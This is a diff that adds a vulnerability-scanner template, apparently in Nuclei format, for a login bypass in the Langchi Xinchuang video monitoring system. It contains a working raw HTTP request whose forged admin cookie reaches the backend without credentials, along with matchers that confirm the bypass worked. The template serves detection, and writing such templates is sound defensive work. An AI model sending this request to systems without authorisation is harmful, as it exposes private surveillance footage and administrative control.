@@ -1,0 +1,31 @@
+id: langchi-xinchuang-permission-bypass
+
+info:
+  name: Langchi Xinchuang Video Monitor Permission Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Langchi Xinchuang video monitoring system has a login bypass vulnerability allowing attackers to access the backend without authentication and view video surveillance.
+  reference:
+    - http://www.launchdigital.net/
+  tags:
+    - permission-bypass
+
+http:
+  - raw:
+      - |
+        GET /content/advc.asp HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: NVSID=admin%23N1123456%23N2{{Hostname}}%23N3sz160sa120sb116sc0
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "href=\"#\" class=\"act\""
+          - "<a href=\"playback.asp\""
+          - "<a href=\"configue.html\""
